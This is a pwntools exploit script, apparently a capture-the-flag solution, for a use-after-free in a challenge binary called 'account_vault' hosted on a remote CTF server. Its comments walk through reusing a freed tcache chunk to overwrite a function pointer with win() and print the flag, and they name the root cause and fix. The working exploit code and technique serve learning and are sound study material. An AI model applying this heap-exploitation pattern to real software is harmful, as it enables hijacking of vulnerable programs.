#!/usr/bin/env python3
from pwn import *

#
# Exploitation strategy:
#
# This binary contains a classic Use-After-Free (UAF) vulnerability.
#
# The `User` object contains a function pointer (`action`) followed by a
# 24-byte name buffer, for a total size of 32 bytes.
#
# 1. Allocate a User object.
#    - `user->action` is initialized to `lose`.
#
# 2. Free the User object.
#    - The chunk is returned to the allocator (tcache), but the `user`
#      pointer is *NOT* set to NULL.
#    - Therefore, `user` becomes a dangling pointer still referencing the
#      freed chunk.
#
# 3. Allocate a Data buffer of the same size.
#    - Since the requested size is identical (32 bytes), glibc's tcache
#      returns the previously freed User chunk.
#    - As a result, `data` and the dangling `user` pointer now reference
#      the same heap chunk.
#
# 4. Write the address of `win()` into the Data buffer.
#    - The first 8 bytes of the chunk correspond to the `action` function
#      pointer in the original User structure.
#    - Writing `p64(win)` overwrites `user->action`.
#
# 5. Trigger "Execute Action".
#    - The program performs:
#          user->action(user);
#      using the dangling pointer.
#
#    - Since `action` now points to `win`, execution is redirected to
#      `win()` and the flag is printed.
#
# Root cause:
#   The program frees the User object but continues to use the stale
#   pointer afterwards. A proper fix would be:
#
#       free(user);
#       user = NULL;    // remember that free() just marks the memory as available, it does NOT clear the pointer !!!
#
#   preventing further dereferences of freed memory.
#

context.binary = elf = ELF('./account_vault', checksec=False)

p = remote("offsec.m0lecon.it", 13599)

win = elf.sym.win

p.sendlineafter(b'> ', b'1')                        
p.sendlineafter(b'> ', b'2')                     
p.sendlineafter(b'> ', b'3')                       
p.sendafter(b'data: ', p64(win).ljust(32, b'X'))
p.sendlineafter(b'> ', b'4')   

print(p.recvall(timeout=2).decode(errors='replace'))
